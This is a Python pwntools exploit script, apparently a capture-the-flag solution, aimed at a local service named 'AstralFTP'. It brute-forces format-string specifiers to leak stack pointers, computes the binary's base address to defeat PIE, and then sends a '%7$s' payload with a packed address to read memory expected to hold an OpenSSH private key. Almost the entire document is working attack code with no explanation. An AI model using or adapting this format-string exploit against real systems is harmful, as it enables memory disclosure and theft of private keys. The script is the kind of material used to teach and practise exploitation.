from pwn import *
failed = 0
numlist = []
for i in range(0,64):
    conn = remote('localhost', 9001)
  #  conn = process('./AstralFTP')
    conn.recvuntil(b'NebulaRogue > ')
    conn.sendline(b'3')
    conn.recvuntil(b'upon: ')
    conn.sendline(b'%'+str(i).encode()+b'$p')
    hexstr = conn.recvline().decode().split(" ")[-1].strip()
    if 'nil' not in hexstr:
        if '0x5' in hexstr:
            print('candidate value '+hexstr+' at '+str(i))
            numlist.append(i)
  #  conn.close()
    conn.close()

for nums in numlist:
    #conn = process('./AstralFTP')
    conn = remote('localhost', 9001)
    conn.recvuntil(b'NebulaRogue > ')
    conn.sendline(b'3')
    conn.recvuntil(b'upon: ')
    conn.sendline(b'%'+str(nums).encode()+b'$p')
    hexstr = conn.recvline().decode().split(" ")[-1].strip()[2:]
    possible_addr = int(hexstr, 16)
    log.info("runtime _start offset: " + hex(possible_addr)) # runtime _start offset
#    gdb.attach(conn, gdbscript='''
#    grep ABGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#               ''')
    _start_offset = 0x00101200
    flag = 0x001040a0

    base_address = possible_addr - _start_offset
    print("Base offset: ", hex(base_address)) # _base offset

    flag_address = base_address + flag
    print("Flag offset: ", hex(flag_address))

    byte_array = bytearray(b'%7$s    ')

    # Convert our address to bytes in reverse order
    address_bytes = flag_address.to_bytes(8, 'little')
    print(binascii.hexlify(address_bytes))

    # Add address and end line to our payload
    byte_array += bytearray(address_bytes)
    byte_array += bytearray(b'\n')
    print(byte_array)
    print(binascii.hexlify(byte_array))
    conn.recvuntil(b'> ')
    conn.send(b'3\n')
    conn.recvuntil(b': ')
    conn.send_raw(byte_array)
    ssh_key = b'a'
    try:
        ssh_key = conn.recvuntil(b'\n ')
    except:
        print('failed on '+str(nums))
    if b'-----BEGIN OPENSSH PRIVATE KEY-----' not in ssh_key:
        continue
    print(ssh_key.decode())
    exit()  